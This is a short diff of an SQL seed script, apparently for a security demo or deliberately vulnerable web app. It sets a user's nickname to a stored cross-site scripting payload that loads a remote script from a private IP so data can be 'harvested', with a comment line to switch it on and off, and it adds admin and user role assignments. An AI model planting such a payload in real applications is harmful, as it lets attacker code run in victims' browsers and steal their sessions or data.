@@ -39,6 +39,10 @@ insert into tb_login_perfil values (1, 2);
 insert into tb_login_perfil values (2, 2);
 
 --habilitar harvest, trocar IP
-update tb_usuario set apelido = '<script src="http://10.230.9.24:8888/i"></script>' where id_usuario = 2
+update tb_usuario set apelido = '<script src="http://10.230.9.24:8888/i"></script>' where id_usuario = 2;
 --desabilitar harvest
-update tb_usuario set apelido = 'Harv' where id_usuario = 2
+update tb_usuario set apelido = 'Harv' where id_usuario = 2;
+
+--Autenticacao e autorizacao
+update tb_perfil set principal = 'admin' where id_perfil = 1;
+update tb_perfil set principal = 'user' where id_perfil = 2;
